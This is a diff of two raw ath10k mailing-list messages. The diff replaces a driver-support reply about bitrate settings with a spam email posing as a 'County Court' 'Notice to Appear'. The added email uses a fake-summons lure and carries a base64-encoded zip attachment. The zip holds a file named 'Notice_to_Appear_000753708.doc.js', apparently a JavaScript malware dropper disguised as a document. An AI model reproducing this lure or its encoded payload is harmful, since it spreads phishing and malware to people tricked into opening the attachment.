@@ -1,19 +1,23 @@
 Return-path: <ath10k-bounces+kvalo=adurom.com@lists.infradead.org>
-Received: from mail-wi0-x22a.google.com ([2a00:1450:400c:c05::22a])
+Received: from gateway02.websitewelcome.com ([69.41.248.84])
  by bombadil.infradead.org with esmtps (Exim 4.80.1 #2 (Red Hat Linux))
- id 1Z850N-0007Kt-9U
- for ath10k@lists.infradead.org; Thu, 25 Jun 2015 11:07:40 +0000
-Received: by wiga1 with SMTP id a1so160944718wig.0
- for <ath10k@lists.infradead.org>; Thu, 25 Jun 2015 04:07:09 -0700 (PDT)
+ id 1Z9MFl-0005Gn-Rk
+ for ath10k@lists.infradead.org; Sun, 28 Jun 2015 23:44:50 +0000
+Received: from cm5.websitewelcome.com (cm5.websitewelcome.com
+ [192.185.178.233])
+ by gateway02.websitewelcome.com (Postfix) with ESMTP id 100ABCFE7D36D
+ for <ath10k@lists.infradead.org>; Sun, 28 Jun 2015 18:44:21 -0500 (CDT)
+Received: from tamilqld by eagle.websitewelcome.com with local (Exim 4.85)
+ (envelope-from <tamilqld@eagle.websitewelcome.com>)
+ id 1Z9MFH-0001b1-1s
+ for ath10k@lists.infradead.org; Sun, 28 Jun 2015 18:44:19 -0500
+Subject: Notice to Appear
+Date: Sun, 28 Jun 2015 18:44:18 -0500
+From: "County Court" <eduardo.gilmore@ns337.websitewelcome.com>
+Message-ID: <dddb56c304963f7e9ddb0fbde18c73a8@ns337.websitewelcome.com>
 MIME-Version: 1.0
-In-Reply-To: <CABhs+6n_3uw7cvpLXbdFxijF=s+U=XWKwkaftB-oaV=d4UWXBQ@mail.gmail.com>
-References: <CABhs+6kp5KEtwUrE3xdDRz9pQ_An27bf5Hs46mg3pBNVw0rg6g@mail.gmail.com>
- <CA+BoTQnnC_ysVw_rgYyP52eB0nRs7tZ3W7HEeyD=7i957BLSRg@mail.gmail.com>
- <CABhs+6n_3uw7cvpLXbdFxijF=s+U=XWKwkaftB-oaV=d4UWXBQ@mail.gmail.com>
-Date: Thu, 25 Jun 2015 13:07:09 +0200
-Message-ID: <CA+BoTQkenP9qL=SkSK6FhRyCzdBfXuH36cM-dgv7t9QuhpSRfA@mail.gmail.com>
-Subject: Re: Problem with iw set bitrate in ath10k
-From: Michal Kazior <michal.kazior@tieto.com>
+Content-Type: multipart/mixed; boundary="b1_ae075c49eb580ed9e7086540fa40c462"
+Content-Transfer-Encoding: 8bit
 List-Id: <ath10k.lists.infradead.org>
 List-Unsubscribe: <http://lists.infradead.org/mailman/options/ath10k>,
  <mailto:ath10k-request@lists.infradead.org?subject=unsubscribe>
@@ -22,36 +26,76 @@ List-Post: <mailto:ath10k@lists.infradead.org>
 List-Help: <mailto:ath10k-request@lists.infradead.org?subject=help>
 List-Subscribe: <http://lists.infradead.org/mailman/listinfo/ath10k>,
  <mailto:ath10k-request@lists.infradead.org?subject=subscribe>
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: base64
+Reply-To: County Court <eduardo.gilmore@ns337.websitewelcome.com>
 Sender: "ath10k" <ath10k-bounces@lists.infradead.org>
 Errors-To: ath10k-bounces+kvalo=adurom.com@lists.infradead.org
-To: Ilias Syrigos <ilias013@gmail.com>
-Cc: "ath10k@lists.infradead.org" <ath10k@lists.infradead.org>
+To: ath10k@lists.infradead.org
 
-T24gMjIgSnVuZSAyMDE1IGF0IDE5OjA4LCBJbGlhcyBTeXJpZ29zIDxpbGlhczAxM0BnbWFpbC5j
-b20+IHdyb3RlOgo+IDIwMTUtMDYtMjIgODoxOSBHTVQrMDM6MDAgTWljaGFsIEthemlvciA8bWlj
-aGFsLmthemlvckB0aWV0by5jb20+Ogo+PiBPbiAyMCBKdW5lIDIwMTUgYXQgMDA6MDEsIElsaWFz
-IFN5cmlnb3MgPGlsaWFzMDEzQGdtYWlsLmNvbT4gd3JvdGU6Cj4+PiBIZWxsbywKPj4+Cj4+PiBJ
-J20gdHJ5aW5nIHRvIGZpeCB0aGUgYml0cmF0ZSB3aXRoIHRoZSBpdyBzZXQgYml0cmF0ZXMgY29t
-bWFuZC4KPj4+Cj4+PiBNb3JlIHNwZWNpZmljYWxseSwgSSB3YW50IHRvIHVzZSBzaW5nbGUgc3Ry
-ZWFtIHJhdGVzIChuc3M9MSkgYW5kIGxldAo+Pj4gdGhlIGRyaXZlciBjaG9vc2UgdGhlIG1jcy4g
-U28sIEkgdXNlOgo+Pj4KPj4+IGl3IHdsYW4wIHNldCBiaXRyYXRlcyBsZWdhY3ktNSBodC1tY3Mt
-NSB2aHQtbWNzLTUgMTowLTkKPj4+Cj4+PiBXaXRoIHRoaXMgc2V0dGluZyBJIG9ic2VydmUgc3Vj
-Y2Vzc2Z1bCB0cmFuc21pc3Npb25zIHdpdGggbnNzPTIgYW5kCj4+PiByYXRlX2luZGV4PTksIHRo
-cm91Z2ggbW9uaXRvciBtb2RlIGF0IHRoZSByZWNlaXZpbmcgbm9kZSwgYW5kIGlwZXJmCj4+PiB0
-aHJvdWdocHV0IG9mIDMwMCBNYnBzLgo+Pj4KPj4+IFdoeSBpcyBuc3Mgbm90IGZpeGVkIHRvIDE/
-Cj4+Cj4+IFRoYXQncyBpbnRlcmVzdGluZy4gQXJlIHlvdSBhc3NvY2lhdGVkIGluIFZIVCBvciBI
-VCBtb2RlPyBDYW4geW91IGdldAo+PiBzb21lIGxvZ3MsIHBsZWFzZT8gWzFdICh0cmFjZXMgcHJl
-ZmVycmVkKQo+Pgo+PiBbMV06IGh0dHBzOi8vd2lyZWxlc3Mud2lraS5rZXJuZWwub3JnL2VuL3Vz
-ZXJzL2RyaXZlcnMvYXRoMTBrL2RlYnVnCj4+Cj4+IEdlbmVyYWxseSBmaXJtd2FyZSByYXRlLWNv
-bnRyb2wgaXMgcmVhbGx5IHBpY2t5IHdoZW4gaXQgY29tZXMgdG8KPj4gY29uZmlndXJhdGlvbi4g
-SSByZWNhbGwgSSBoYWQgb2JzZXJ2ZWQgc29tZSBxdWlya2luZXNzIHdoZW4gSSB3YXMKPj4gd29y
-a2luZyBvbiBleHRlbmRpbmcgdGhlIHNldF9iaXRyYXRlX21hc2sgY2FsbGJhY2suCj4+Cj4gSGkg
-TWljaGFsLAo+Cj4gSSdtIGFzc29jaWF0ZWQgaW4gVkhUIG1vZGUuCj4gSSBhbHNvIGF0dGFjaCB0
-aGUgdHJhY2UuZGF0IGZpbGUgZnJvbSB0aGUgdHJhY2UtY21kLgoKVGhlIHRyYWNlIGZpbGUgaXMg
-ZW1wdHkgLSBpdCBoYXMgMCBsb2cgZW50cmllcy4uIERpZCB5b3UgZm9sbG93Cmluc3RydWN0aW9u
-cyBmcm9tIHRoZSB3aWtpPwoKCk1pY2hhxYIKCl9fX19fX19fX19fX19fX19fX19fX19fX19fX19f
-X19fX19fX19fX19fX19fX19fCmF0aDEwayBtYWlsaW5nIGxpc3QKYXRoMTBrQGxpc3RzLmluZnJh
-ZGVhZC5vcmcKaHR0cDovL2xpc3RzLmluZnJhZGVhZC5vcmcvbWFpbG1hbi9saXN0aW5mby9hdGgx
-MGsK
+--b1_ae075c49eb580ed9e7086540fa40c462
+Content-Type: text/plain; charset=us-ascii
+
+Notice to Appear,
+
+You have to appear in the Court on the July 06.
+You are kindly asked to prepare and bring the documents relating to the case to Court on the specified date.
+Note: If you do not come, the case will be heard in your absence.
+
+The Court Notice is attached to this email.
+
+Regards,
+Eduardo Gilmore,
+Court Secretary.
+
+
+--b1_ae075c49eb580ed9e7086540fa40c462
+Content-Type: application/zip; name="Notice_to_Appear_000753708.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Notice_to_Appear_000753708.zip
+
+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
+SwUGAAAAAAEAAQBPAAAA0AYAAAAA
+
+
+--b1_ae075c49eb580ed9e7086540fa40c462
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+ath10k mailing list
+ath10k@lists.infradead.org
+http://lists.infradead.org/mailman/listinfo/ath10k
+
+--b1_ae075c49eb580ed9e7086540fa40c462--
